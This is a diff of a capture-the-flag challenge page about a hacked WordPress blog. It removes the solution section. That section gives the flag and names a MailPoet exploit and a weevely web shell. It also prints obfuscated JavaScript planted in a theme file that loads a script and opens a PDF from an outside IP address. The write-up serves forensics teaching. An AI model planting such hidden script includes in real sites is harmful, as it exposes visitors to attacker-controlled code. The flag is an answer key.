@@ -1842,11 +1842,7 @@
                 
             <li class="second-level"><a href="#description">Description</a></li>
                 
-            <li class="second-level"><a href="#flag">Flag</a></li>
-                
-            <li class="second-level"><a href="#solution">Solution</a></li>
-                
-            <li class="second-level"><a href="#setup">Setup</a></li>
+            <li class="second-level"><a href="#topics-covered">Topics Covered</a></li>
                 
     </ul>
 </div></div>
@@ -1862,51 +1858,7 @@
 <h2 id="description">Description<a class="headerlink" href="#description" title="Permanent link">&para;</a></h2>
 <p>"OH NO WE'VE BEEN HACKED!!!!!! -- said the Eye Heart Fluffy Bunnies Blog owner. Life was grand for the fluff fanatic until one day the site's users started to get attacked! Apparently fluffy bunnies are not just a love of fun furry families but also furtive foreign governments. The notorious ""Forgotten Freaks"" hacking group was known to be targeting high powered politicians. Were the cute bunnies the next in their long list of conquests!??
 Well... The fluff needs your stuff. I've pulled the logs from the server for you along with a backup of it's database and configuration. Figure out what is going on!"</p>
-<h2 id="flag">Flag<a class="headerlink" href="#flag" title="Permanent link">&para;</a></h2>
-<p><code class="codehilite">key{Those Fluffy Bunnies Make Tummy Bumpy}</code></p>
-<h2 id="solution">Solution<a class="headerlink" href="#solution" title="Permanent link">&para;</a></h2>
-<p>Within the apache log file (/var/logs/apache2/access.log) is an indicator of attack for the MailPoet vulnerability. Details here: <a href="http://blog.sucuri.net/2014/07/mailpoet-vulnerability-exploited-in-the-wild-breaking-thousands-of-wordpress-sites.html">http://blog.sucuri.net/2014/07/mailpoet-vulnerability-exploited-in-the-wild-breaking-thousands-of-wordpress-sites.html</a>
-I dont expect people to find that really, but maybe they will. The vulnerability is exploited and uploads two files to</p>
-<div class="codehilite"><pre><span></span>/var/www/html/wp-content/uploads/wysija/themes/weblizer
-</pre></div>
-
-
-<p>template.php is a weevely shell. There is also a single execution command entry in the access.log of the attacker's modifications to the wordpress install, but people might not notice that either.
-The attacker modified <code class="codehilite">/var/www/html/wp-content/themes/twentythirteen/js/html5.js</code> which only gets rendered if a user is using IE9 or below.</p>
-<div class="codehilite"><pre><span></span><span class="c">&lt;!--[if lt IE 9]&gt;</span>
-<span class="c">    &lt;script src=&quot;http://blog.eyeheartfluffybunnies.com/wp-content/themes/twentythirteen/js/html5.js&quot;&gt;&lt;/script&gt;</span>
-<span class="c">    &lt;![endif]--&gt;</span>
-</pre></div>
-
-
-<p>This is not attacker added code, but naturally occuring. You can see this from the source on the webpage. My expectation is people will actually create a LAMP server to replicate and notice this condition or do a diff of the plugins/themes.
-However they get there, they'll hopefully notice that html5.js has a modification:</p>
-<div class="codehilite"><pre><span></span>var g=&quot;ti&quot;;var c=&quot;HTML Tags&quot;;var f=&quot;. li colgroup br src datalist script option .&quot;;f = f.split(&quot; &quot;);c=&quot;&quot;;k=&quot;/&quot;;m=f[6];for(var i=0;i<span class="nt">&lt;f.length</span><span class="err">;i++){c+=f[i].length.toString();}</span><span class="na">v=</span><span class="s">f[0];x=&quot;\&#39;ht&quot;;b=f[4];f=2541*6-35+46+12-15269;c+=f.toString();f=(56+31+68*65+41-548)/4000-1;c+=f.toString();f=&quot;&quot;;c=c.split(&quot;&quot;);var</span> <span class="na">w=</span><span class="s">0;u=&quot;s&quot;;for(var</span> <span class="na">i=</span><span class="s">0;i&lt;c.length;i++){if(((i==3||i==6)&amp;&amp;w!=2)||((i==8)&amp;&amp;w==2)){f+=String.fromCharCode(46);w++;}f+=c[i];}</span> <span class="na">i=</span><span class="s">k+&quot;anal&quot;;</span> <span class="err">document.write(&quot;&lt;&quot;+m+&quot;</span> <span class="err">&quot;+b+&quot;=&quot;+x+&quot;tp:&quot;+k+k+f+i+&quot;y&quot;+g+&quot;c&quot;+u+v+&quot;j&quot;+u+&quot;\&#39;</span><span class="nt">&gt;</span>\<span class="err">&lt;</span>/&quot;+m+&quot;\&gt;&quot;);
-</pre></div>
-
-
-<p>This is an obfuscated way to do a script include from <a href="http://128.238.66.100/analytics.js">http://128.238.66.100/analytics.js</a>
-Students could notice this, or maybe use developer mode in the browser to see the js include.
-Once to <code class="codehilite">analytics.js</code>, there is more obfuscation its basically two giagantic blocks of dummy code around:</p>
-<div class="codehilite"><pre><span></span>var _0x91fe=[&quot;\x68\x74\x74\x70\x3A\x2F\x2F\x31\x32\x38\x2E\x32\x33\x38\x2E\x36\x36\x2E\x31\x30\x30\x2F\x61\x6E\x6E\x6F\x75\x6E\x63\x65\x6D\x65\x6E\x74\x2E\x70\x64\x66&quot;,&quot;\x5F\x73\x65\x6C\x66&quot;,&quot;\x6F\x70\x65\x6E&quot;];window[_0x91fe[2]](_0x91fe[0],_0x91fe[1]);
-</pre></div>
-
-
-<p>This opens a new window that renders <a href="http://128.238.66.100/announcement.pdf">http://128.238.66.100/announcement.pdf</a>
-I expect that students will either use a user-agent switcher or &lt;IE9 to get the request for announcement.pdf. I dont know that anyone will deal with the javascript.
-Then the announcement.pdf has a file stream in it, you can</p>
-<div class="codehilite"><pre><span></span>pdfextract announcement.pdf
-cd announcement.dump/streams
-cat steam_8
-</pre></div>
-
-
-<p>to see another javascript obfuscated version of:</p>
-<div class="codehilite"><pre><span></span>var key = &quot;YOU DID IT! CONGRATS! fwiw, javascript obfuscation is sofa king dumb  :) key{Those Fluffy Bunnies Make Tummy Bumpy}&quot;;
-</pre></div>
-
-
-<h2 id="setup">Setup<a class="headerlink" href="#setup" title="Permanent link">&para;</a></h2></div>
+<h2 id="topics-covered">Topics Covered<a class="headerlink" href="#topics-covered" title="Permanent link">&para;</a></h2></div>
             
         
     </div>
